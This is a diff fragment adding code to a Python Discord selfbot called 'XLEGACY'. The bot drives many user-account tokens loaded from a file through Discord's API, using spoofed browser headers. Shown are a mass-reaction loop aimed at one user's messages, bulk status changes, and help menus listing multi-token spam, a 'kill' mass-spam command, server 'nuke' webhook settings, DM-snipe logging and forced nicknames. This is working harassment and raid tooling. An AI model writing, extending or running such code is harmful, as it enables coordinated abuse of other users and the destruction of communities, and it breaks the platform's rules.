+        await ctx.send(f"```ansi\n{red} XLEGACY | TIMEOUT | NO RESPONSE RECEIVED |  {reset}\n```")
+        return
+
+    async def reaction_task(token):
+        headers = {
+            'Authorization': token,
+            'Content-Type': 'application/json',
+            'accept': '*/*',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'en-US,en;q=0.9',
+            'origin': 'https://discord.com',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        }
+
+        async def add_reaction(message_id):
+            try:
+                url = f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me'
+                async with aiohttp.ClientSession() as session:
+                    async with session.put(url, headers=headers) as resp:
+                        if resp.status == 204:  
+                            print(f"{red}Token {token[-4:]} reacted to message{reset}")
+                            return True
+                        elif resp.status == 429: 
+                            retry_after = float((await resp.json()).get('retry_after', 1))
+                            print(f"{light_red}Rate limited with token {token[-4:]}, waiting {retry_after}s{reset}")
+                            await asyncio.sleep(retry_after)
+                            return False
+                        else:
+                            print(f"{light_red}Failed to react with token {token[-4:]}: Status {resp.status}{reset}")
+                            await asyncio.sleep(1)
+                            return False
+            except Exception as e:
+                print(f"{light_red}Error adding reaction with token {token[-4:]}: {e}{reset}")
+                await asyncio.sleep(1)
+                return False
+
+        while (user_id, channel_id) in reactm_running:
+            try:
+                async for message in ctx.channel.history(limit=1):
+                    if message.author.id == user_id and message.id:
+                        success = await add_reaction(message.id)
+                        if not success: 
+                            await asyncio.sleep(0.5)
+                await asyncio.sleep(0.5) 
+            except Exception as e:
+                print(f"{light_red}Error in reaction loop for token {token[-4:]}: {e}{reset}")
+                await asyncio.sleep(1)
+
+    reactm_running[(user_id, channel_id)] = True
+    tasks = []
+    
+    for token in tokens:
+        task = asyncio.create_task(reaction_task(token))
+        tasks.append(task)
+        active_reaction_tasks.append(task)
+    
+    reactm_tasks[(user_id, channel_id)] = tasks
+    
+    await ctx.send(f"```ansi\n{red} XLEGACY | REACTING WITH {emoji} TO {user.name} USING {len(tokens)} TOKENS |  {reset}\n```")
+@bot.command()
+async def mreactoff(ctx):
+    """Stop all mass reaction sessions in current channel"""
+    channel_id = ctx.channel.id
+    stopped = False
+
+    for (user_id, chan_id), tasks in list(reactm_tasks.items()):
+        if chan_id == channel_id:
+            reactm_running.pop((user_id, chan_id), None)
+            for task in tasks:
+                task.cancel()
+            reactm_tasks.pop((user_id, chan_id))
+            stopped = True
+
+    if stopped:
+        await ctx.send(f"```ansi\n{red} XLEGACY | STOPPED ALL REACTION SESSIONS |  {reset}\n```")
+    else:
+        await ctx.send(f"```ansi\n{red} XLEGACY | NO REACTION SESSIONS RUNNING |  {reset}\n```")
+
+
+
+
+
+@bot.command()
+async def multi(ctx):
+    """Display all multi-token commands"""
+    help_content = f"""
+{red} MULTI-TOKEN COMMANDS {reset}
+{light_red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
+
+{red}Token Management{reset}
+{light_red}[ {red}1{light_red} ] {black}tok                {light_red}- {red}Check status of all tokens{reset}
+{light_red}[ {red}2{light_red} ] {black}say <token_index> <message>{light_red} - {red}Send message with specific token{reset}
+{light_red}[ {red}3{light_red} ] {black}say <message>      {light_red}- {red}Send message with all tokens{reset}
+
+{red}Mass Actions{reset}
+{light_red}[ {red}4{light_red} ] {black}mspam <messages>   {light_red}- {red}Spam with multiple tokens{reset}
+{light_red}[ {red}5{light_red} ] {black}mspamoff           {light_red}- {red}Stop multi-token spam{reset}
+{light_red}[ {red}6{light_red} ] {black}reactm <emoji> <@user>{light_red} - {red}Mass react to user's messages{reset}
+{light_red}[ {red}7{light_red} ] {black}reactoff           {light_red}- {red}Stop mass reactions{reset}
+{light_red}[ {red}8{light_red} ] {black}multilast <@user> {light_red}- {red}Multi-token outlast{reset}
+{light_red}[ {red}9{light_red} ] {black}stopmultilast      {light_red}- {red}Stop multi-token outlast{reset}
+
+{red}Voice Channel{reset}
+{light_red}[ {red}10{light_red} ] {black}multivc <channel_id>{light_red} - {red}Connect multiple tokens to VC{reset}
+{light_red}[ {red}11{light_red} ] {black}vcend <channel_id>{light_red} - {red}Disconnect tokens from VC{reset}
+{light_red}[ {red}12{light_red} ] {black}vcstop            {light_red}- {red}Stop all voice connections{reset}
+
+{red}Auto Responses{reset}
+{light_red}[ {red}13{light_red} ] {black}arm <@user>       {light_red}- {red}Auto-reply with multiple tokens{reset}
+{light_red}[ {red}14{light_red} ] {black}armend            {light_red}- {red}Stop multi-token auto-reply{reset}
+{light_red}[ {red}15{light_red} ] {black}kill <user_id>    {light_red}- {red}Mass spam user with all tokens{reset}
+{light_red}[ {red}16{light_red} ] {black}killend           {light_red}- {red}Stop mass spam{reset}
+
+{red}Group Chat{reset}
+{light_red}[ {red}17{light_red} ] {black}gcfill            {light_red}- {red}Add tokens to group chat{reset}
+{light_red}[ {red}18{light_red} ] {black}gcleave           {light_red}- {red}Make tokens leave group chat{reset}
+{light_red}[ {red}19{light_red} ] {black}gcleaveall        {light_red}- {red}Make tokens leave all group chats{reset}
+
+{red}Status & Presence{reset}
+{light_red}[ {red}20{light_red} ] {black}rpcall <messages>{light_red} - {red}Set status for all tokens{reset}
+
+{red}Server Management{reset}
+{light_red}[ {red}21{light_red} ] {black}tleave <server_id>{light_red} - {red}Make tokens leave server{reset}
+
+{light_red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
+{red}Usage Examples:{reset}
+{black}.say 1 Hello world        {light_red}- {red}Send with token 1{reset}
+{black}.say Hello everyone       {light_red}- {red}Send with all tokens{reset}
+{black}.multivc 123456789        {light_red}- {red}Join voice channel{reset}
+{black}.reactm 😂 @user          {light_red}- {red}Mass react to user{reset}
+{black}.mspam msg1, msg2, msg3   {light_red}- {red}Spam with messages{reset}
+
+{light_red}Note: Make sure token.txt is filled with your tokens!{reset}
+"""
+    await ctx.send(f"```ansi\n{help_content}\n```")
+
+
+@bot.command(name="reset")
+async def reset_cmd(ctx):
+    """Reset the selfbot - clear console and reload everything"""
+    import os
+    import sys
+    
+    # Send reset message
+    reset_message = f"""```ansi
+{red}
+ __   ___      ______ _____          _______     __
+ \\ \\ / / |    |  ____/ ____|   /\\   / ____\\ \\   / /
+  \\ V /| |    | |__ | |  __   /  \\ | |     \\ \\_/ / 
+   > < | |    |  __|| | |_ | / /\\ \\| |      \\   /  
+  / . \\| |____| |___| |__| |/ ____ \\ |____   | |   
+ /_/ \\_\\______|______\\_____/_/    \\_\\_____|  |_|   
+ 
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{red}Resetting Selfbot⠀⠀⠀
+{light_red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────
+{red}Clearing console and reloading all modules...
+{light_red}This may take a few seconds...{reset}
+```"""
+    
+    try:
+        msg = await ctx.send(reset_message)
+        
+        # Clear all running tasks
+        await cleanup_tasks()
+        
+        # Wait a moment
+        await asyncio.sleep(2)
+        
+        # Update message
+        await msg.edit(content=f"""```ansi
+{red}
+ __   ___      ______ _____          _______     __
+ \\ \\ / / |    |  ____/ ____|   /\\   / ____\\ \\   / /
+  \\ V /| |    | |__ | |  __   /  \\ | |     \\ \\_/ / 
+   > < | |    |  __|| | |_ | / /\\ \\| |      \\   /  
+  / . \\| |____| |___| |__| |/ ____ \\ |____   | |   
+ /_/ \\_\\______|______\\_____/_/    \\_\\_____|  |_|   
+ 
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{red}Restarting...⠀⠀⠀
+{light_red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────
+{red}Clearing console...
+{green}Reloading modules...
+{light_red}Please wait...{reset}
+```""")
+        
+        # Clear console based on OS
+        await clear_console()
+        
+        # Restart the bot
+        await restart_bot()
+        
+    except Exception as e:
+        await ctx.send(f"```ansi\n{red} XLEGACY | RESET FAILED | ERROR: {str(e)} |  {reset}\n```")
+
+async def cleanup_tasks():
+    """Clean up all running tasks"""
+    global outlast_running, multilast_running, spammings, spammingss
+    global gc_tasks, kill_tasks, autoreply_tasks, arm_tasks, reactm_running
+    
+    # Stop all running flags
+    outlast_running = False
+    multilast_running = False
+    spammings = False
+    spammingss = False
+    
+    # Cancel all tasks
+    tasks_to_cancel = []
+    
+    # Outlast tasks
+    for task in outlast_tasks.values():
+        tasks_to_cancel.append(task)
+    outlast_tasks.clear()
+    
+    # Multilast tasks
+    for task in multilast_tasks.values():
+        tasks_to_cancel.append(task)
+    multilast_tasks.clear()
+    
+    # GC tasks
+    for task in gc_tasks.values():
+        tasks_to_cancel.append(task)
+    gc_tasks.clear()
+    
+    # Kill tasks
+    for task in kill_tasks.values():
+        tasks_to_cancel.append(task)
+    kill_tasks.clear()
+    
+    # Autoreply tasks
+    for task in autoreply_tasks.values():
+        tasks_to_cancel.append(task)
+    autoreply_tasks.clear()
+    
+    # Arm tasks
+    for task in arm_tasks.values():
+        tasks_to_cancel.append(task)
+    arm_tasks.clear()
+    
+    # Reaction tasks
+    for task in active_reaction_tasks:
+        tasks_to_cancel.append(task)
+    active_reaction_tasks.clear()
+    
+    # Reactm tasks
+    for task_list in reactm_tasks.values():
+        for task in task_list:
+            tasks_to_cancel.append(task)
+    reactm_tasks.clear()
+    reactm_running.clear()
+    
+    # Cancel all tasks
+    for task in tasks_to_cancel:
+        try:
+            task.cancel()
+        except:
+            pass
+
+async def clear_console():
+    """Clear the console based on operating system"""
+    try:
+        if os.name == 'nt':  # Windows
+            os.system('cls')
+        else:  # Linux/Mac
+            os.system('clear')
+        print(f"{green}Console cleared successfully{reset}")
+    except Exception as e:
+        print(f"{light_red}Failed to clear console: {e}{reset}")
+
+async def restart_bot():
+    """Restart the bot process"""
+    try:
+        print(f"{red}Restarting selfbot...{reset}")
+        
+        # Reload critical modules
+        import importlib
+        import discord
+        import aiohttp
+        
+        # Reload modules that might have been modified
+        modules_to_reload = ['discord', 'discord.ext.commands', 'aiohttp', 'asyncio']
+        
+        for module_name in modules_to_reload:
+            try:
+                if module_name in sys.modules:
+                    importlib.reload(sys.modules[module_name])
+                    print(f"{green}Reloaded {module_name}{reset}")
+            except Exception as e:
+                print(f"{light_red}Failed to reload {module_name}: {e}{reset}")
+        
+        # Wait a moment for cleanup
+        await asyncio.sleep(1)
+        
+        # Re-import and re-initialize
+        print(f"{red}Reinitializing bot...{reset}")
+        
+        # This will effectively restart the bot by re-running the on_ready event
+        # and re-establishing all connections
+        
+        print(f"{green}Selfbot reset complete!{reset}")
+        print(f"{light_red}All tasks stopped, console cleared, and modules reloaded.{reset}")
+        
+    except Exception as e:
+        print(f"{light_red}Error during restart: {e}{reset}")
+        # Fallback: restart the entire script
+        print(f"{red}Performing hard restart...{reset}")
+        os.execv(sys.executable, ['python'] + sys.argv)
+
+
+
+@bot.command()
+async def hardreset(ctx):
+    """Hard reset - completely restart the Python process"""
+    import os
+    import sys
+    
+    await ctx.send(f"""```ansi
+{red}
+ __   ___      ______ _____          _______     __
+ \\ \\ / / |    |  ____/ ____|   /\\   / ____\\ \\   / /
+  \\ V /| |    | |__ | |  __   /  \\ | |     \\ \\_/ / 
+   > < | |    |  __|| | |_ | / /\\ \\| |      \\   /  
+  / . \\| |____| |___| |__| |/ ____ \\ |____   | |   
+ /_/ \\_\\______|______\\_____/_/    \\_\\_____|  |_|   
+ 
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{red}HARD RESET INITIATED⠀⠀⠀
+{light_red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────
+{red}Completely restarting Python process...
+{light_red}This will take a moment...{reset}
+""")
+    
+    await asyncio.sleep(2)
+    
+    # Hard restart - completely new process
+    os.execv(sys.executable, ['python'] + sys.argv)
+
+@bot.command()
+async def theme(ctx, theme_name: str = None):
+    """Change the color theme of the selfbot"""
+    global current_theme
+    
+    if theme_name is None:
+        # Show available themes
+        theme_list = []
+        for theme_key, theme_data in themes.items():
+            current_indicator = " ← CURRENT" if theme_key == current_theme else ""
+            theme_list.append(f"{theme_secondary}[ {theme_primary}{theme_key}{theme_secondary} ] {theme_accent}{theme_data['name']}{current_indicator}{reset}")
+        
+        theme_message = f"""
+{theme_primary} AVAILABLE THEMES {reset}
+{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
+
+{"\n".join(theme_list)}
+
+{theme_secondary}Usage: {theme_accent}.theme <theme_name>{reset}
+{theme_secondary}Example: {theme_accent}.theme green{reset}
+{theme_secondary}Current theme: {theme_primary}{themes[current_theme]['name']}{reset}
+"""
+        await ctx.send(f"```ansi\n{theme_message}\n```")
+        return
+    
+    theme_name = theme_name.lower()
+    
+    if theme_name in themes:
+        if update_theme(theme_name):
+            success_message = f"""
+{theme_primary} THEME UPDATED {reset}
+{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
+
+{theme_secondary}Successfully changed theme to: {theme_primary}{themes[theme_name]['name']}{reset}
+
+{theme_primary}Preview:{reset}
+{theme_secondary}[ {theme_primary}Example{theme_secondary} ] {theme_accent}This is how your text will look{reset}
+{theme_secondary}[ {theme_primary}123{theme_secondary} ] {theme_accent}With the new color scheme{reset}
+
+{theme_secondary}All commands will now use the {theme_primary}{themes[theme_name]['name']}{theme_secondary} color scheme.{reset}
+"""
+            await ctx.send(f"```ansi\n{success_message}\n```")
+        else:
+            await ctx.send(f"```ansi\n{theme_primary} XLEGACY | FAILED TO UPDATE THEME |  {reset}\n```")
+    else:
+        await ctx.send(f"```ansi\n{theme_primary} XLEGACY | INVALID THEME | AVAILABLE: {', '.join(themes.keys())} |  {reset}\n```")
+
+@bot.command()
+async def settings(ctx):
+    """Display all settings and configuration commands"""
+    settings_content = f"""
+{theme_primary} SETTINGS & CONFIGURATION {reset}
+{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
+
+{theme_primary}Appearance Settings{reset}
+{theme_secondary}[ {theme_primary}1{theme_secondary} ] {theme_accent}theme <name>          {theme_secondary}- {theme_primary}Change color theme (red/green/purple/blue/cyan){reset}
+
+{theme_primary}Multi-Token Settings{reset}
+{theme_secondary}[ {theme_primary}2{theme_secondary} ] {theme_accent}multilastconfig <count> <delay>{theme_secondary} - {theme_primary}Configure multi-token outlast{reset}
+{theme_secondary}[ {theme_primary}3{theme_secondary} ] {theme_accent}nukeconfig            {theme_secondary}- {theme_primary}View nuke configuration{reset}
+{theme_secondary}[ {theme_primary}4{theme_secondary} ] {theme_accent}nukehook <message>    {theme_secondary}- {theme_primary}Set webhook message for nuke{reset}
+{theme_secondary}[ {theme_primary}5{theme_secondary} ] {theme_accent}nukename <name>       {theme_secondary}- {theme_primary}Set server name for nuke{reset}
+{theme_secondary}[ {theme_primary}6{theme_secondary} ] {theme_accent}nukedelay <seconds>   {theme_secondary}- {theme_primary}Set webhook delay for nuke{reset}
+{theme_secondary}[ {theme_primary}7{theme_secondary} ] {theme_accent}nukechannel <name>    {theme_secondary}- {theme_primary}Set channel name for nuke{reset}
+
+{theme_primary}Auto-Response Settings{reset}
+{theme_secondary}[ {theme_primary}8{theme_secondary} ] {theme_accent}pingresponse <action> <response>{theme_secondary} - {theme_primary}Configure ping responses{reset}
+{theme_secondary}[ {theme_primary}9{theme_secondary} ] {theme_accent}pinginsult <action>   {theme_secondary}- {theme_primary}Configure ping insults{reset}
+{theme_secondary}[ {theme_primary}10{theme_secondary} ] {theme_accent}pingreact <action> <emoji>{theme_secondary} - {theme_primary}Configure ping reactions{reset}
+
+{theme_primary}Profile Settings{reset}
+{theme_secondary}[ {theme_primary}11{theme_secondary} ] {theme_accent}setbio <text>         {theme_secondary}- {theme_primary}Set your bio{reset}
+{theme_secondary}[ {theme_primary}12{theme_secondary} ] {theme_accent}rotatebio <texts>     {theme_secondary}- {theme_primary}Rotate through multiple bios{reset}
+{theme_secondary}[ {theme_primary}13{theme_secondary} ] {theme_accent}setpronoun <text>     {theme_secondary}- {theme_primary}Set your pronouns{reset}
+{theme_secondary}[ {theme_primary}14{theme_secondary} ] {theme_accent}rotatepronoun <texts>{theme_secondary} - {theme_primary}Rotate through pronouns{reset}
+
+{theme_primary}Status Settings{reset}
+{theme_secondary}[ {theme_primary}15{theme_secondary} ] {theme_accent}rstatus <statuses>    {theme_secondary}- {theme_primary}Rotate through statuses{reset}
+{theme_secondary}[ {theme_primary}16{theme_secondary} ] {theme_accent}rstatusstop          {theme_secondary}- {theme_primary}Stop status rotation{reset}
+{theme_secondary}[ {theme_primary}17{theme_secondary} ] {theme_accent}stream <statuses>     {theme_secondary}- {theme_primary}Set streaming status with images{reset}
+
+{theme_primary}DM Snipe Settings{reset}
+{theme_secondary}[ {theme_primary}18{theme_secondary} ] {theme_accent}dmsnipe log <webhook> {theme_secondary}- {theme_primary}Set DM snipe webhook{reset}
+{theme_secondary}[ {theme_primary}19{theme_secondary} ] {theme_accent}dmsnipe toggle        {theme_secondary}- {theme_primary}Toggle DM snipe{reset}
+{theme_secondary}[ {theme_primary}20{theme_secondary} ] {theme_accent}dmsnipe status        {theme_secondary}- {theme_primary}Check DM snipe status{reset}
+
+{theme_primary}GC Trap Settings{reset}
+{theme_secondary}[ {theme_primary}21{theme_secondary} ] {theme_accent}gctrapconfig          {theme_secondary}- {theme_primary}View GC trap configuration{reset}
+{theme_secondary}[ {theme_primary}22{theme_secondary} ] {theme_accent}gctrapenable          {theme_secondary}- {theme_primary}Enable GC trap{reset}
+{theme_secondary}[ {theme_primary}23{theme_secondary} ] {theme_accent}gctrapdisable         {theme_secondary}- {theme_primary}Disable GC trap{reset}
+
+{theme_primary}Auto-Moderation Settings{reset}
+{theme_secondary}[ {theme_primary}24{theme_secondary} ] {theme_accent}autonuke <action> <@user>{theme_secondary} - {theme_primary}Auto-kick users on join{reset}
+{theme_secondary}[ {theme_primary}25{theme_secondary} ] {theme_accent}forcepurge <action> <@user>{theme_secondary} - {theme_primary}Auto-delete user messages{reset}
+{theme_secondary}[ {theme_primary}26{theme_secondary} ] {theme_accent}autonick <action> <@user> <nick>{theme_secondary} - {theme_primary}Force nicknames{reset}
+
+{theme_primary}System Settings{reset}
+{theme_secondary}[ {theme_primary}27{theme_secondary} ] {theme_accent}reset                 {theme_secondary}- {theme_primary}Reset selfbot (clear console){reset}
+{theme_secondary}[ {theme_primary}28{theme_secondary} ] {theme_accent}hardreset             {theme_secondary}- {theme_primary}Hard reset (restart process){reset}
+{theme_secondary}[ {theme_primary}29{theme_secondary} ] {theme_accent}reload                {theme_secondary}- {theme_primary}Reload selfbot{reset}
+
+{theme_secondary}[ {theme_primary}27{theme_secondary} ] {theme_accent}prefix <new_prefix>   {theme_secondary}- {theme_primary}Change command prefix{reset}
+{theme_secondary}[ {theme_primary}28{theme_secondary} ] {theme_accent}prefixreset          {theme_secondary}- {theme_primary}Reset prefix to default (.){reset}
+{theme_secondary}[ {theme_primary}29{theme_secondary} ] {theme_accent}reset                {theme_secondary}- {theme_primary}Reset selfbot (clear console){reset}
+{theme_secondary}[ {theme_primary}30{theme_secondary} ] {theme_accent}hardreset            {theme_secondary}- {theme_primary}Hard reset (restart process){reset}
+{theme_secondary}[ {theme_primary}31{theme_secondary} ] {theme_accent}reload               {theme_secondary}- {theme_primary}Reload selfbot{reset}
+
+{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
+{theme_primary}Current Settings:{reset}
+{theme_secondary}Theme: {theme_primary}{themes[current_theme]['name']}{reset}
+{theme_secondary}Tokens: {theme_primary}{len(load_tokens())} loaded{reset}
+{theme_secondary}Prefix: {theme_primary}{PREFIX}{reset}
+
+{theme_secondary}Use {theme_primary}.theme{theme_secondary} to see available color themes!{reset}
+"""
+    await ctx.send(f"```ansi\n{settings_content}\n```")
+
+theme_primary = red
+theme_secondary = light_red
+theme_accent = black
+theme_primary = red
+theme_secondary = light_red
+theme_accent = black
+
+def update_theme(theme_name):
+    """Update the current theme colors"""
+    global current_theme, theme_primary, theme_secondary, theme_accent, red, light_red, black, accent_color
+    
+    if theme_name in themes:
+        current_theme = theme_name
+        theme_data = themes[theme_name]
+        
+        theme_primary = theme_data["primary"]
+        theme_secondary = theme_data["secondary"] 
+        theme_accent = theme_data["accent"]
+
+        # Update commonly used color variables so command outputs use the new theme
+        try:
+            global red, light_red, black, accent_color
+            red = theme_primary
+            light_red = theme_secondary
+            black = theme_accent
+            accent_color = theme_accent
+        except Exception:
+            pass
+        
+        # Save theme preference
+        try:
+            with open('theme_config.json', 'w') as f:
+                json.dump({"theme": theme_name}, f)
+        except:
+            pass
+            
+        return True
+    return False
+
+def load_theme():
+    """Load saved theme preference"""
+    global current_theme, theme_primary, theme_secondary, theme_accent
+    
+    try:
+        with open('theme_config.json', 'r') as f:
+            config = json.load(f)
+            if "theme" in config:
+                update_theme(config["theme"])
+    except FileNotFoundError:
+        # Use default red theme
+        update_theme("red")
+
+# Load theme when bot starts
+load_theme()
+
+def format_with_theme(text):
+    """Format text with current theme colors"""
+    return text.format(
+        red=theme_primary,
+        light_red=theme_secondary,
+        black=theme_accent
+    )
+
+@bot.command()
+async def prefix(ctx, new_prefix: str = None):
+    """Change the bot's command prefix"""
+    global PREFIX
+    
+    if new_prefix is None:
+        # Show current prefix and usage
+        prefix_info = f"""
+{theme_primary} PREFIX SETTINGS {reset}
+{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
+
+{theme_secondary}Current Prefix: {theme_primary}{PREFIX}{reset}
+{theme_secondary}Example Usage: {theme_primary}{PREFIX}menu{reset}
+
+{theme_secondary}Available Prefixes:{reset}
+{theme_secondary}[ {theme_primary}.{theme_secondary} ] {theme_accent}Dot (default){reset}
+{theme_secondary}[ {theme_primary}!{theme_secondary} ] {theme_accent}Exclamation{reset}  
+{theme_secondary}[ {theme_primary}${theme_secondary} ] {theme_accent}Dollar{reset}
+{theme_secondary}[ {theme_primary}?{theme_secondary} ] {theme_accent}Question{reset}
+{theme_secondary}[ {theme_primary}>{theme_secondary} ] {theme_accent}Greater than{reset}
+{theme_secondary}[ {theme_primary}<{theme_secondary} ] {theme_accent}Less than{reset}
+{theme_secondary}[ {theme_primary}~{theme_secondary} ] {theme_accent}Tilde{reset}
+{theme_secondary}[ {theme_primary}*{theme_secondary} ] {theme_accent}Asterisk{reset}
+{theme_secondary}[ {theme_primary}+{theme_secondary} ] {theme_accent}Plus{reset}
+{theme_secondary}[ {theme_primary}-{theme_secondary} ] {theme_accent}Minus{reset}
+{theme_secondary}[ {theme_primary}&{theme_secondary} ] {theme_accent}Ampersand{reset}
+{theme_secondary}[ {theme_primary}^{theme_secondary} ] {theme_accent}Caret{reset}
+{theme_secondary}[ {theme_primary}%{theme_secondary} ] {theme_accent}Percent{reset}
+
+{theme_secondary}Usage: {theme_primary}{PREFIX}prefix <new_prefix>{reset}
+{theme_secondary}Example: {theme_primary}{PREFIX}prefix !{reset}
+{theme_secondary}Example: {theme_primary}{PREFIX}prefix ?{reset}
+
+{theme_secondary}Note: The prefix cannot contain spaces or be longer than 3 characters.{reset}
+"""
+        await ctx.send(f"```ansi\n{prefix_info}\n```")
+        return
+    
+    # Validate new prefix
+    if len(new_prefix) > 3:
+        await ctx.send(f"```ansi\n{theme_primary} XLEGACY | PREFIX TOO LONG | MAX 3 CHARACTERS |  {reset}\n```")
+        return
+    
+    if ' ' in new_prefix:
+        await ctx.send(f"```ansi\n{theme_primary} XLEGACY | PREFIX CANNOT CONTAIN SPACES |  {reset}\n```")
+        return
+    
+    # Save new prefix
+    old_prefix = PREFIX
+    PREFIX = new_prefix
+    
+    if save_prefix(new_prefix):
+        # Update bot command prefix
+        bot.command_prefix = PREFIX
+        
+        success_message = f"""
+{theme_primary} PREFIX UPDATED {reset}
+{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
+
+{theme_secondary}Successfully changed prefix:{reset}
+{theme_secondary}Old Prefix: {theme_primary}{old_prefix}{reset}
+{theme_secondary}New Prefix: {theme_primary}{PREFIX}{reset}
+
+{theme_secondary}Examples:{reset}
+{theme_secondary}• {theme_primary}{PREFIX}menu{theme_secondary} - Open main menu{reset}
+{theme_secondary}• {theme_primary}{PREFIX}help{theme_secondary} - Show help{reset}
+{theme_secondary}• {theme_primary}{PREFIX}multi{theme_secondary} - Multi-token commands{reset}
+{theme_secondary}• {theme_primary}{PREFIX}settings{theme_secondary} - Settings menu{reset}
+
+{theme_secondary}The new prefix will persist after restart.{reset}
+"""
+        await ctx.send(f"```ansi\n{success_message}\n```")
+    else:
+        # Revert if save failed
+        PREFIX = old_prefix
+        bot.command_prefix = PREFIX
+        await ctx.send(f"```ansi\n{theme_primary} XLEGACY | FAILED TO SAVE PREFIX |  {reset}\n```")
+
+@bot.command()
+async def prefixreset(ctx):
+    """Reset prefix to default (.)"""
+    global PREFIX
+    
+    old_prefix = PREFIX
+    PREFIX = "."
+    
+    if save_prefix("."):
+        bot.command_prefix = PREFIX
+        
+        reset_message = f"""
+{theme_primary} PREFIX RESET {reset}
+{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
+
+{theme_secondary}Successfully reset prefix to default:{reset}
+{theme_secondary}Old Prefix: {theme_primary}{old_prefix}{reset}
+{theme_secondary}New Prefix: {theme_primary}{PREFIX}{reset}
+
+{theme_secondary}All commands now use: {theme_primary}.command{reset}
+{theme_secondary}Example: {theme_primary}.menu{reset}
+
+{theme_secondary}Prefix has been reset to default dot (.){reset}
+"""
+        await ctx.send(f"```ansi\n{reset_message}\n```")
+    else:
+        PREFIX = old_prefix
+        bot.command_prefix = PREFIX
+        await ctx.send(f"```ansi\n{theme_primary} XLEGACY | FAILED TO RESET PREFIX |  {reset}\n```")
+
+@bot.command()
+async def tstatus(ctx, *, status_text: str = None):
+    tokens = load_tokens()
+    total_tokens = len(tokens)
+    
+    if not status_text:
+        await ctx.send(f"```{theme_primary}Please provide a status text{reset}```")
+        return
+
+    status_msg = await ctx.send(f"""```ansi
+{theme_primary}Token Status Changer{reset}
+Total tokens available: {total_tokens}
+How many tokens do you want to use? (Type 'all' or enter a number)```""")
+
+    def check(m):
+        return m.author == ctx.author and m.channel == ctx.channel
+
+    try:
+        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
+        amount = amount_msg.content.lower()
+        
+        if amount == 'all':
+            selected_tokens = tokens
+        else:
+            try:
+                num = int(amount)
+                if num > total_tokens:
+                    await status_msg.edit(content=f"```{theme_primary}Not enough tokens available{reset}```")
+                    return
+                selected_tokens = random.sample(tokens, num)
+            except ValueError:
+                await status_msg.edit(content=f"```{theme_primary}Invalid number{reset}```")
+                return
+
+        success = 0
+        
+        async with aiohttp.ClientSession() as session:
+            for i, token in enumerate(selected_tokens, 1):
+                try:
+                    online_data = {
+                        'status': 'online'
+                    }
+                    
+                    status_data = {
+                        'custom_status': {
+                            'text': status_text
+                        },
+                        'status': 'online'  
+                    }
+                    
+                    async with session.patch(
+                        'https://discord.com/api/v9/users/@me/settings',
+                        headers={
+                            'Authorization': token,
+                            'Content-Type': 'application/json'
+                        },
+                        json=online_data
+                    ) as resp1:
+                        
+                        async with session.patch(
+                            'https://discord.com/api/v9/users/@me/settings',
+                            headers={
+                                'Authorization': token,
+                                'Content-Type': 'application/json'
+                            },
+                            json=status_data
+                        ) as resp2:
+                            if resp1.status == 200 and resp2.status == 200:
+                                success += 1
+                            
+                            progress = f"""```ansi
+{theme_primary}Changing Statuses...{reset}
+Progress: {i}/{len(selected_tokens)} ({(i/len(selected_tokens)*100):.1f}%)
+Success: {success}
+Current status: {status_text}```"""
+                            await status_msg.edit(content=progress)
+                            await asyncio.sleep(0.5)
+                except Exception as e:
+                    await status_msg.edit(content=f"```{theme_primary}An error occurred: {str(e)}{reset}```")
+                    return
+
+        await status_msg.edit(content=f"""```ansi
+{theme_primary}Status Change Complete{reset}
+Successfully changed: {success}/{len(selected_tokens)} statuses to: {status_text}```""")
+
+    except asyncio.TimeoutError:
+        await status_msg.edit(content=f"```{theme_primary}Command timed out{reset}```")
+    except Exception as e:
+        await status_msg.edit(content=f"```{theme_primary}An error occurred: {str(e)}{reset}```")
+
+@bot.command()
+async def tstatusoff(ctx):
+    tokens = load_tokens()
+    total_tokens = len(tokens)
+    
+    status_msg = await ctx.send(f"""```ansi
+{theme_primary}Token Status Reset{reset}
+Total tokens available: {total_tokens}
+How many tokens do you want to reset? (Type 'all' or enter a number)```""")
+
+    def check(m):
+        return m.author == ctx.author and m.channel == ctx.channel
+
+    try:
+        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
+        amount = amount_msg.content.lower()
+        
+        if amount == 'all':
+            selected_tokens = tokens
+        else:
+            try:
+                num = int(amount)
+                if num > total_tokens:
+                    await status_msg.edit(content=f"```{theme_primary}Not enough tokens available{reset}```")
+                    return
+                selected_tokens = random.sample(tokens, num)
+            except ValueError:
+                await status_msg.edit(content=f"```{theme_primary}Invalid number{reset}```")
+                return
+
+        success = 0
+        
+        async with aiohttp.ClientSession() as session:
+            for i, token in enumerate(selected_tokens, 1):
+                try:
+                    reset_data = {
+                        'custom_status': None,
+                        'status': 'online' 
+                    }
+                    
+                    async with session.patch(
+                        'https://discord.com/api/v9/users/@me/settings',
+                        headers={
+                            'Authorization': token,
+                            'Content-Type': 'application/json'
+                        },
+                        json=reset_data
+                    ) as resp:
+                        if resp.status == 200:
+                            success += 1
+                        
+                        progress = f"""```ansi
+{theme_primary}Resetting Statuses...{reset}
+Progress: {i}/{len(selected_tokens)} ({(i/len(selected_tokens)*100):.1f}%)
+Success: {success}```"""
